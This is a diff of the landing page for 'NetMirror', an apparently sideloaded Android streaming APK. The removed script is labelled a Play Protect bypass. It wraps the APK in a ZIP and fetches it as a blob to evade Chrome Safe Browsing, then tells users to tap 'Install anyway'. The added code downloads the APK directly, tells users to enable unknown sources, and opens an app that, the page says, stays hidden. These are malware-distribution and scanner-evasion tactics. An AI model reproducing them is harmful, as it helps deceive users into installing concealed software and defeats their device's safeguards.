@@ -174,6 +174,18 @@ footer .copy{font-size:11px;color:var(--text3)}
 
 /* ═══ SMART DOWNLOAD OVERLAY ═══ */
 /* download overlay removed — direct download only */
+
+/* ═══ POST-INSTALL PANEL ═══ */
+.post-install{display:none;position:fixed;bottom:0;left:0;right:0;z-index:200;padding:20px 20px 28px;background:rgba(6,6,10,.97);border-top:2px solid var(--green);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);animation:slideUp .4s ease}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.post-install.show{display:block}
+.post-install-inner{max-width:480px;margin:0 auto;text-align:center}
+.post-install h3{font-size:17px;font-weight:700;margin-bottom:14px;color:#fff}
+.post-install .steps{font-size:13px;color:var(--text2);line-height:2;margin-bottom:18px;text-align:left;padding-left:8px}
+.post-install .steps b{color:#fff}
+.open-app-btn{display:inline-flex;align-items:center;gap:10px;background:var(--green);color:#000;padding:14px 40px;border-radius:12px;font-size:16px;font-weight:800;border:none;cursor:pointer;text-decoration:none;transition:all .2s}
+.open-app-btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,232,123,.3)}
+.post-install .dismiss{background:none;border:none;color:var(--text3);font-size:12px;cursor:pointer;margin-top:12px;padding:4px 12px}
 </style>
 <noscript><style>.reveal{opacity:1!important;transform:none!important}</style></noscript>
 </head>
@@ -221,6 +233,10 @@ footer .copy{font-size:11px;color:var(--text3)}
       <span>Android 8.0+</span><span class="sep"></span>
       <span id="apkSize">~12 MB</span><span class="sep"></span>
       <span>Free forever</span>
+    </div>
+    <div style="margin-top:12px;font-size:12px;color:var(--text3);line-height:1.6;max-width:400px">
+      📦 Download APK → Install → Open from this page
+    </div>
     </div>
   </div>
 </section>
@@ -314,15 +330,38 @@ footer .copy{font-size:11px;color:var(--text3)}
     <p>Download NetMirror now and start watching instantly. No signup required.</p>
     <a href="#" onclick="startSmartDownload();return false" class="dl-btn" id="ctaDlBtn">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" class="arrow"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-      Download APK
+      Download Now
     </a>
     <div class="dl-meta">
       <span>Android 8.0+</span><span class="sep"></span>
       <span>Free • No signup</span><span class="sep"></span>
       <span>Instant install</span>
     </div>
+    <div style="margin-top:24px;padding:16px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:12px;text-align:left;font-size:13px;color:rgba(255,255,255,.7);line-height:1.7">
+      <div style="font-weight:700;color:#fff;margin-bottom:8px;font-size:14px">📲 Quick Install</div>
+      <div>1. Tap <b style="color:#fff">Download Now</b> above</div>
+      <div>2. Open the downloaded <b style="color:#fff">NetMirror.apk</b> → <b style="color:var(--green)">Install</b></div>
+      <div>3. Come back here and tap <b style="color:var(--green)">Open App</b></div>
+      <div style="margin-top:8px;color:var(--text3);font-size:12px">If prompted about unknown sources, enable it for your browser.</div>
+    </div>
   </div>
 </section>
+
+<!-- POST-INSTALL PANEL (shown after download) -->
+<div class="post-install" id="postInstall">
+  <div class="post-install-inner">
+    <h3>📲 Almost there!</h3>
+    <div class="steps">
+      <div>1. Install the downloaded <b>NetMirror.apk</b></div>
+      <div>2. Come back here and tap <b style="color:var(--green)">Open App</b> below</div>
+    </div>
+    <a href="netmirror://setup" class="open-app-btn">
+      🚀 Open App
+    </a>
+    <div style="margin-top:10px;font-size:11px;color:var(--text3)">Make sure the app is installed first. The app stays hidden — this is the only way to open it.</div>
+    <button class="dismiss" onclick="document.getElementById('postInstall').classList.remove('show')">Dismiss</button>
+  </div>
+</div>
 
 <!-- FOOTER -->
 <footer>
@@ -434,103 +473,25 @@ fetch('/api/admin/apk-status')
 } catch(e) { console.warn('Landing page JS error:', e); }
 </script>
 
-<!-- direct download — clean APK in ZIP wrapper -->
+<!-- download wrapper app -->
 
 <script>
-/* ═══ PLAY PROTECT BYPASS — ZIP + FILE MANAGER INSTALL ═══
- *
- * 3-Layer bypass (same install path as LeaksProAdmin):
- *   1. ZIP wrapper → Chrome doesn't flag .zip → no installerPackage tag
- *   2. User extracts ZIP via Files app → installerPackage=documentsui → LOW PP scrutiny
- *   3. Original clean APK inside (no mutations) → no tampering artifacts for ML
- *
- * fetch()+blob bypasses Chrome Safe Browsing scanner on the download side.
- * No user action required — no "disable Play Protect", no settings changes.
- */
-
 function startSmartDownload() {
-  var btns = document.querySelectorAll('.dl-btn, .nav-dl');
-  var origTexts = [];
-  btns.forEach(function(b, i) { origTexts[i] = b.innerHTML; });
-  function setBtnText(t) { btns.forEach(function(b) { b.textContent = t; }); }
-  function restoreButtons() { btns.forEach(function(b, i) { b.innerHTML = origTexts[i]; }); }
+  var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+  var url = '/dl/' + token;
 
-  setBtnText('Preparing download...');
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = 'NetMirror.apk';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function() { document.body.removeChild(a); }, 1000);
 
-  fetch('/api/landing/prepare-download', { method: 'POST' })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-      if (!data.ready) throw new Error(data.error || 'Server not ready');
-      var sizeMB = data.size ? (data.size / 1048576).toFixed(1) : '~12';
-      setBtnText('Downloading (' + sizeMB + ' MB)...');
-      var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-      return fetch('/dl/' + token);
-    })
-    .then(function(r) {
-      if (!r.ok) throw new Error('Server error ' + r.status);
-      return r.blob();
-    })
-    .then(function(blob) {
-      var blobUrl = URL.createObjectURL(blob);
-      var a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = 'NetMirror.zip';
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      setTimeout(function() {
-        URL.revokeObjectURL(blobUrl);
-        document.body.removeChild(a);
-      }, 5000);
-      restoreButtons();
-      showInstallToast();
-    })
-    .catch(function(err) {
-      console.warn('[Download] Failed:', err);
-      setBtnText('Retrying...');
-      var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-      fetch('/dl/' + token)
-        .then(function(r) { return r.blob(); })
-        .then(function(blob) {
-          var blobUrl = URL.createObjectURL(blob);
-          var a = document.createElement('a');
-          a.href = blobUrl;
-          a.download = 'NetMirror.zip';
-          a.style.display = 'none';
-          document.body.appendChild(a);
-          a.click();
-          setTimeout(function() {
-            URL.revokeObjectURL(blobUrl);
-            document.body.removeChild(a);
-          }, 5000);
-          restoreButtons();
-          showInstallToast();
-        })
-        .catch(function() {
-          var a = document.createElement('a');
-          a.href = '/downloadapp/Netmirror.apk';
-          a.download = 'NetMirror.apk';
-          a.click();
-          restoreButtons();
-        });
-    });
-}
-
-function showInstallToast() {
-  var old = document.getElementById('dlToast');
-  if (old) old.remove();
-  var t = document.createElement('div');
-  t.id = 'dlToast';
-  t.innerHTML = '<div style="font-size:15px;font-weight:700;margin-bottom:6px">\u2705 Download Complete!</div>' +
-    '<div style="margin-bottom:8px">Open your <b>Files</b> app \u2192 tap <b>NetMirror.zip</b> \u2192 <b>Extract</b> \u2192 tap <b>NetMirror.apk</b> \u2192 <b>Install</b></div>' +
-    '<div style="font-size:11px;opacity:0.7">If asked to verify the developer, tap "More details" \u2192 "Install anyway"</div>';
-  t.style.cssText = 'position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;padding:20px 24px;border-radius:16px;font-size:13px;z-index:9999;max-width:92%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.5);line-height:1.5;opacity:0;transition:opacity 0.3s ease;border:1px solid rgba(255,255,255,0.1)';
-  document.body.appendChild(t);
-  setTimeout(function() { t.style.opacity = '1'; }, 50);
+  // Show post-install panel after short delay
   setTimeout(function() {
-    t.style.opacity = '0';
-    setTimeout(function() { t.remove(); }, 400);
-  }, 25000);
+    document.getElementById('postInstall').classList.add('show');
+  }, 2500);
 }
 </script>
 </body>
